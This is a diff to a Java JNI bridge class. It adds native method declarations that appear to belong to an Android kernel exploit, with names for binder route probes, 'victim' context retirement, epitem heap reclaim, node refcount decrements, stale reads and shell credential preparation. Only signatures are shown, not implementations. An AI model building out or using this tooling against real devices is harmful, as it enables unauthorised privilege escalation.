@@ -62,6 +62,10 @@ final class NativeBridge {
 
     static native String inspectRemoteBinderParcel(Parcel parcel);
 
+    static native String exportParcelTemplate(Parcel parcel, String path);
+
+    static native String prepareProbeShellCredential();
+
     static native String rawBinderRouteProbe(Parcel serviceManagerParcel,
                                               Parcel startServiceParcel,
                                               long callbackPointer,
@@ -70,10 +74,29 @@ final class NativeBridge {
 
     static native String releaseRawBinderRouteProbes();
 
+    static native String startRawBinderHolderRoutes(
+            String serviceTemplatePath, String startTemplatePath,
+            int expectedHolders, int indexSentinel);
+
+    static native String startRawVictimExports(String serviceTemplatePath,
+                                                String startTemplatePath,
+                                                int expectedVictims);
+
+    static native long[] collectRawVictimExports(int expectedVictims);
+
+    static native String queueAndRetireRawVictimContext(int victim);
+
+    static native String releaseRawVictimContexts(int expectedVictims);
+
     static native String receiveRawBinderHolderRefs(int expectedHolders,
                                                      int fixedRefsPerHolder,
                                                      int expectedProof,
                                                      int deathObjectIndex);
+
+    static native String releaseRawBinderHolderHandles(
+            int expectedHandles, int expectedDeaths);
+
+    static native String extendMixedSharedEpitemReclaim(int targetCount);
 
     static native String cveTransport(long ownerPointer, long ownerCookie);
 
@@ -108,10 +131,15 @@ final class NativeBridge {
 
     static native boolean armEpitemLeakOwner(String directory);
 
+    static native int createRawTargetBoundarySignal();
+
+    static native boolean closeRawTargetBoundarySignal();
+
     static native boolean armRawTargetOwner(String directory, String nonce,
                                              String bootId,
                                              long targetStartTime,
-                                             boolean terminalCleanup);
+                                             boolean terminalCleanup,
+                                             int boundarySignalFd);
 
     static native String cleanupOwnerFragmentBuffers();
 
@@ -120,9 +148,17 @@ final class NativeBridge {
     static native String runEpitemLeakClient();
 
     static native String reclaimWithEpitems(String directory);
+    static native String prepareMixedEpitemReclaim(String directory);
+    static native String beginMixedEpitemReclaim();
+    static native String openMixedBinderWindow(int count);
+    static native String extendMixedEpitemReclaim(int targetPairCount);
+    static native String completeMixedEpitemReclaim();
+    static native String discardMixedEpitemReclaim();
     static native String analyseEpitemLeak(String directory);
 
     static native String decrementNodeBatch(String directory);
+    static native String decrementNodeBatchRange(
+            String directory, int start, int count, boolean notifyPredrain);
 
     static native String enableStaleRead(String directory);
 
